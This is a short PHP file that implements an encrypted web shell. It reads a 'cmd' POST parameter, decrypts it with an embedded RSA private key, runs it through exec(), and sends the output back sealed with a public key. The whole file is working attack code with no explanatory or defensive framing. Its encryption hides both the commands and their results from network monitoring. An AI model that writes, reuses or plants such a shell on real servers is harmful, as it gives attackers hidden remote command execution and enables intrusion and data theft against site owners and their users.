<?php

$pubkey= "[PUBLIC-KEY]";


$privkey="[PRIVATE-KEY]";

if (isset($_POST['cmd']))
{
$cmd=decrypt_cmd($privkey);
$results=execute($cmd);	
encrypt($results,$pubkey);
}
function decrypt_cmd($privkey){
$cmd=($_POST['cmd']);

#$cmd is encoded with base64 for lossless transfer
$enc_cmd=base64_decode($cmd);
#$enc_cmd now has encrypted command

openssl_private_decrypt($enc_cmd,$cmd,$privkey, OPENSSL_PKCS1_OAEP_PADDING);

#$cmd now has the plaintext cmd
return ($cmd);
}
function execute($cmd)
{
$result = "";
exec($cmd,$array);
foreach ($array as $line){
       	$result=$result . $line ."\n";
	}
return ($result);
#result is a string containing cmd output
}

function encrypt($plaintext,$pubkey){
openssl_seal($plaintext, $sealed, $pass, array($pubkey));
echo base64_encode($pass[0]) . "<br />" . base64_encode($sealed);
}
?> 
